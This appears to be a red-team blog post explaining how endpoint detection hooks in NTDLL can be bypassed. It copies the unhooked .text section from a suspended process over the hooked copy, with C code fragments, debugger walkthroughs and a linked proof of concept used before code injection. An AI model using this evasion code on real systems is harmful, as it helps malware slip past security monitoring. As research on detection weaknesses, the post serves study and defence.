---
title: "[EDR Bypass] Bypass userland hooking using suspended processes."
header:
  teaser: "https://farm5.staticflickr.com/4076/4940499208_b79b77fb0a_z.jpg"
categories: 
  - EN
tags:
  - EN
  - Red Team
  - Defense evasion
  - EDR bypass
  - Windows PE format
  - Malware
author: Alejandro Pinna
---

¡Hi!

First of all, those who want to read this post in spanish, this was originally published in Innotec Security blog:

- [Innotec Security Blog](https://security-garage.com/index.php/es/investigaciones/userland-hooking-using-suspended-processes)

Today we will be watching one of the most common techniques used by EDR and Antivirus systems to detect activities carried out by processes in Windows environments.

Currently, EDRs have different possibilities to carry out this monitoring. 
On the one hand, in some cases functions exposed by the Windows kernel are used.
On the other hand, the Threat Intelligence sources provided by the operating system itself are used, such as EtwTI, this can be listed using the <code  style="background-color: lightgrey; color:black;"><b>logman query providers</b></code> command, as shown below.


```c
C:\Users\vm1\Desktop\exploiting\OSED>logman query providers "Microsoft-Windows-Threat-Intelligence"

Proveedor                                 GUID
-------------------------------------------------------------------------------
Microsoft-Windows-Threat-Intelligence    {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}

Valor               Palabra clave        Descripción
-------------------------------------------------------------------------------
0x0000000000000001  KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL
0x0000000000000002  KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL_KERNEL_CALLER
0x0000000000000004  KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE
0x0000000000000008  KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE_KERNEL_CALLER
0x0000000000000010  KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL
0x0000000000000020  KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL_KERNEL_CALLER
0x0000000000000040  KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE
0x0000000000000080  KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE_KERNEL_CALLER
0x0000000000000100  KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL
0x0000000000000200  KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL_KERNEL_CALLER
0x0000000000000400  KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE
0x0000000000000800  KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE_KERNEL_CALLER
0x0000000000001000  KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE
0x0000000000002000  KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE_KERNEL_CALLER
0x0000000000004000  KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE
0x0000000000008000  KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE_KERNEL_CALLER
0x0000000000010000  KERNEL_THREATINT_KEYWORD_READVM_LOCAL
0x0000000000020000  KERNEL_THREATINT_KEYWORD_READVM_REMOTE
0x0000000000040000  KERNEL_THREATINT_KEYWORD_WRITEVM_LOCAL
0x0000000000080000  KERNEL_THREATINT_KEYWORD_WRITEVM_REMOTE
0x0000000000100000  KERNEL_THREATINT_KEYWORD_SUSPEND_THREAD
0x0000000000200000  KERNEL_THREATINT_KEYWORD_RESUME_THREAD
0x0000000000400000  KERNEL_THREATINT_KEYWORD_SUSPEND_PROCESS
0x0000000000800000  KERNEL_THREATINT_KEYWORD_RESUME_PROCESS
0x0000000001000000  KERNEL_THREATINT_KEYWORD_FREEZE_PROCESS
0x0000000002000000  KERNEL_THREATINT_KEYWORD_THAW_PROCESS
0x0000000004000000  KERNEL_THREATINT_KEYWORD_CONTEXT_PARSE
0x0000000008000000  KERNEL_THREATINT_KEYWORD_EXECUTION_ADDRESS_VAD_PROBE
0x0000000010000000  KERNEL_THREATINT_KEYWORD_EXECUTION_ADDRESS_MMF_NAME_PROBE
0x0000000020000000  KERNEL_THREATINT_KEYWORD_READWRITEVM_NO_SIGNATURE_RESTRICTION
0x0000000040000000  KERNEL_THREATINT_KEYWORD_DRIVER_EVENTS
0x0000000080000000  KERNEL_THREATINT_KEYWORD_DEVICE_EVENTS
0x8000000000000000  Microsoft-Windows-Threat-Intelligence/Analytic

Valor               Nivel                Descripción
-------------------------------------------------------------------------------
0x04                win:Informational    Información

PID                 Imagen
-------------------------------------------------------------------------------
0x00000000


El comando se completó correctamente.
```

Finally, the most known and documented technique until this moment is Userland-Hooking, consisting on intercepting calls to perform monitoring over different internal windows functions.

The most common is to find that monitorization directly implemented over the syscalls existing in NTDLL.

This is because NTDLL is the DLL exposed to the userland in charge to realize as an "Exchange" between userland and kernel-land, as can be seen in this diagram.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/2022_05_20-bypass-userland-hooking/diagram.png)

We known that all processes running in Windows OS may load an image of NTDLL to call the different cappabilities exposed by Windows API.

Analyzing the procedure of process creation documented inside Windows Internals book, we can observe that once a process is initialized, the system will perform the following steps.

1. Parameter validation, Windows Subsystem operations, etc
2. Loads the PE image in memory
3. Initialize the process structures, both in kernel-land and user-land (_EPROCESS, _KPROCESS, _PEB, etc)
4. Creates the initial thread (not launched yet).
5. Does operations post-process creation, as some operations related with the subsystem of Windows.
6. Starts the initial thread, unless the process has been created in suspended state.
7. In the context of new processes and threads, the memory space of the process is completed (resolves IAT, etc) and starts executio at the Entry-Point.

Those steps can be seen in a graphic manner next:

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/2022_05_20-bypass-userland-hooking/graphic_process_init.png)

Watching closely those steps, we can see that initially, before calling the EntryPoint of the process, the function RtlUserThreadStart residing in NTDLL, will be in charge of realizing the steps in point 7.

This can be seen using Windbg, using the following start configuration.

<code  style="background-color: lightgrey; color:black;"><b>windbg -xe ld:ntdll.dll explorer.exe</b></code>

And later, analyzing DLLs loaded by the process once started in Windb, we can see that only NTDLL is loaded, and the function that will be executed is RtlUserThreadStart.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/2022_05_20-bypass-userland-hooking/windbg_suspended_process.png)

Also can be seen how the PEB structure is not fully loaded in this point, for example, Ldr is not loaded yet, so we can't enumerate DLLs loaded by the process using **_LDR_DATA_TABLE_ENTRY**.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/2022_05_20-bypass-userland-hooking/peb_not_intialized.png)

With this analysis, we can see that a suspended process will have a copy of NTDLL loaded in memory, and this is not modified ~~hooked~~ by the EDR yet. 

To check this we are going to see the state of the Syscalls of functions that are known to be hooked by EDR systems, such as NtQueueUserAPC, NtReadVirtualMemory, etc.

In this case we will use x64dbg, so we setup the debugger to break when the system DLL is loaded.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/2022_05_20-bypass-userland-hooking/x64dbg_configuration.png)

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/2022_05_20-bypass-userland-hooking/windbg_functions_not_hooked.png)

Comparing that with a hooked syscall, we can see that when a process is suspended, the functions are not hooked, and when the process is resumed, the functions are intercepted by the EDR, adding a jmp instruction, that will redirect the execution flow to the EDR DLL.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/2022_05_20-bypass-userland-hooking/EDR_dll.png)

With this approach, the door is open to copy the memory of the NTDLL loaded in a suspended process, which is not yet hooked, and replace the **.text** section in a process we want to use to perform further actions in the system, being out of the radar of the EDR.

To do this, the following steps will be followed.

1. A suspended process is created. It's important to differentiate between 32 and 64 bits process.
2. PEB structure is parsed.
3. ImageBaseAddress of the PEB is located.


```c
						...
_NtQueryInformationProcess ntQueryInformationProcess =
	(_NtQueryInformationProcess)fpNtQueryInformationProcess;
/*Information del proceso suspendido para sacar la direccion del PEB*/
NTSTATUS status = (*ntQueryInformationProcess)(hProc, 0, &BasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &dwSize);

if (!NT_SUCCESS(status))
{
	printf("Error: %d\n", GetLastError());
	return 0;
}
unsigned long long baseAddress = (unsigned long long)BasicInfo.PebBaseAddress;
SIZE_T bytesRead;
/*Leo el PEB*/
BOOL bSuccess = ReadProcessMemory(hProc, (LPCVOID)baseAddress, &pPeb, sizeof(PEB), &bytesRead);
if (!bSuccess)
{
	printf("Error: %d\n", GetLastError());
	throw EXCEPTION_STACK_OVERFLOW;
}
/*Con el PEB me quedo con el address de la base de la imagen*/
LPVOID imageBase = pPeb.ImageBaseAddress;
				...
```

4. Call VirtualQueryEx, searching all mapped regions with MEM_COMMIT & MEM_IMAGE state.

```c
				...
int contador = 1;
/*Enumeramos las secciones del proceso*/
while (VirtualQueryEx(hProc, addr, &basic, sizeof(MEMORY_BASIC_INFORMATION)))
{
	LPVOID oldaddr = addr;
	if (basic.State == MEM_COMMIT && basic.Type == MEM_IMAGE) /*Si una seccion es de tipo imagen*/
	{
		delete[] buffer;
		buffer = new char[basic.RegionSize];
		/*Leemos la memoria de esa seccion*/
		bSuccess = ReadProcessMemory(hProc, basic.BaseAddress, buffer, basic.RegionSize, &bytesRead);
		if (!bSuccess)
		{
			printf("Error: %d\n", GetLastError());

			return 0;
		}
				...
```
5. Those regions are readed, searching for magic bytes of PE file.

```c
		...
bSuccess = ReadProcessMemory(hProc, basic.BaseAddress, buffer, basic.RegionSize, &bytesRead);
if (!bSuccess)
{
	printf("Error: %d\n", GetLastError());

	return 0;
}
for (unsigned int j = 0; j < bytesRead; j++)
{
	/*Hay algun tramo de memoria con bytes magic de PE32*/
	if (buffer[j] == 'M' && buffer[j + 1] == 'Z' && buffer[j + 3] == '\0' && buffer[j + 79] == 'h')
		...
```

6. Once the magic bytes are found, we check if this is the first time we found a PE in this loop, if this is the case, it will be the PE32 file of the executable, so we move the address to the end of that image, and go on.

```c
...
if (contador == 1)
{
	if (j != 0)
		addr = LPVOID((unsigned long long)addr + j);
	if (j != 0)
		bSuccess = ReadProcessMemory(hProc, addr, buffer, basic.RegionSize, &bytesRead);
	if (!bSuccess)
	{
		printf("Error final one: %d\n", GetLastError());
		return 0;
	}
	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)buffer;
	LPVOID ntdllBase = (LPVOID)mi2.lpBaseOfDll;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((unsigned long long)buffer + pDOSHeader->e_lfanew);
	/*Ahi ese donde saco el tamano del PE32 para luego saltarmelo*/
	addr = LPVOID((unsigned long long)addr + ntHeader->OptionalHeader.SizeOfImage);
	contador += 1;
	goto continuar;
}
...
```
7. Once located the second PE image we know this is the NTDLL.

8. We read the memory of that region, enumerating different sections of the DLL, until we locate .text section.

```c
...

/*Si no fuese la primera posicion del iterador de la seccion, pues me reemplazo addr
por addr mas iterador*/
if (j != 0)
	addr = LPVOID((unsigned long long)addr + j);
if (j != 0)
	bSuccess = ReadProcessMemory(hProc, addr, buffer, basic.RegionSize, &bytesRead);
if (!bSuccess)
{
	printf("Error final one: %d\n", GetLastError());
	return 0;
}
//printf("Found ntdll image in: 0x%x.\n", (LPVOID)((unsigned long long)basic.BaseAddress + j));
/*Operaciones con las estructuras PE32 para sacar el numero de secciones de la DLL y donde empieza
en si la DLL y dicha seccion*/
PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)buffer;
LPVOID ntdllBase = (LPVOID)mi2.lpBaseOfDll;
PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)((unsigned long long)buffer + pDOSHeader->e_lfanew);


for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) //iteramos las secciones
{
	//Sacamos el nombre de cada seccion
	PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((unsigned long long)IMAGE_FIRST_SECTION(ntHeader) + ((unsigned long long)IMAGE_SIZEOF_SECTION_HEADER * i));
	//Si es la seccion text estamos de suerte
	if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text"))
...
```

9. We get the size of the text section, copying the content of that in .text section of the NTDLL belonging to the parent process.

```c
...
unsigned long long size_section = hookedSectionHeader->Misc.VirtualSize;
//Guardamos el addr de la seccion text (coincide con el addr de mi propia seccion text de mi dll, gracias microsoft!!
unsigned long long hookedAddr = hookedSectionHeader->VirtualAddress;
addr = LPVOID((unsigned long long)addr + hookedSectionHeader->VirtualAddress);
//Comprobamos el tamano de memoria que podemos leer de ahi, para que no de por saco
VirtualQueryEx(hProc, addr, &basic, sizeof(MEMORY_BASIC_INFORMATION));
delete[] buffer;

#ifdef _M_X64 
/*Ese numero es por tema de padding, sino anade byte nulls al final que no hacen falta*/
buffer = new char[basic.RegionSize - 2000];
/*Leemos la seccion text de la dll del proceso suspendido*/
bSuccess = ReadProcessMemory(hProc, addr, buffer, basic.RegionSize - 2000, &bytesRead);
if (!bSuccess)
{
	printf("Error reading the last: %d\n", GetLastError());
	return 0;
}
//Por motivos de debug si quieres puedes dumpearla ;) 
/*FILE* fp = fopen("C:\\Temp\\log_text.txt", "wb+");
fwrite(buffer, bytesRead, 1, fp);
fclose(fp);*/

DWORD oldProtection, oldProtection2 = 0;
/*
Cambiamos el protect de esa zona para darnos permisos de escritura, y luego
finalmente escribimos la DLL que habiamos leido antes en el proceso suspendido en
mi DLL hookeada por el EDR*/

bool isProtected = VirtualProtect((LPVOID)((unsigned long long)ntdllBase + (unsigned long long)hookedAddr), basic.RegionSize - 2000, PAGE_EXECUTE_READWRITE, &oldProtection);

/*¡¡Thanks to ired.team i didn´t lost my mind trying to calculate that address!!*/
/*https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++*/


memcpy((LPVOID)((unsigned long long)ntdllBase + (unsigned long long)hookedAddr), buffer, basic.RegionSize - 2000);
...
```

Let's debug in x64dbg this process, to see how the syscall of ZwQueueUserApcThread is cleaned after executing the POC.

First of all we see how this function was previously hooked by one of the EDRs we have in the team.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/2022_05_20-bypass-userland-hooking/zw_queue_hooked.png)

Following we are going to see the execution of unhook function, which will clean our NTDLL.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/2022_05_20-bypass-userland-hooking/bp_in_unhook.png)

We have added a breakpoint in memcpy function, and a hardware breakpoint in the direction of ZwQueueUserApcThread, so when we step over memcpy, the execution will be stopped by the hardware breakpoint.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/2022_05_20-bypass-userland-hooking/memcpy_bp.png)

We see how once executed, execution is stopped by the hardware breakpoint.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/2022_05_20-bypass-userland-hooking/hardware_bp_stops.png)

And after pressing F8 the previously hooked function is now cleaned.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/2022_05_20-bypass-userland-hooking/cleaned_function.png)

#POC

As an example, we will see what happens when we try to inject code using **Early Bird Process Injection** without unhooking the NTDLL of the injector.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/2022_05_20-bypass-userland-hooking/detected_early.png)

And after unhooking that NTDLL, we can inject arbitrary code.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/2022_05_20-bypass-userland-hooking/injection_performed.png)

Poc is published in https://github.com/waawaa/unhook_from_memory/


#Conclusion
We see how some internal behaviors of windows allow an attacker to bypass security mechanisms used by EDRs / NGAV. 
Usually when those mechanisms are implanted in userland, a non privileged user can defeat them, that is the underlying reason why a lot of EDR / NGAV software is working hard to implant security detection from the kernel and not the user-land.




References:
- https://blog.sektor7.net/#!res/2021/perunsfart.md
- https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c
- https://twitter.com/aionescu/status/1066014417903439872
- https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/
- https://undev.ninja/introduction-to-threat-intelligence-etw/
- https://github.com/am0nsec/HellsGate







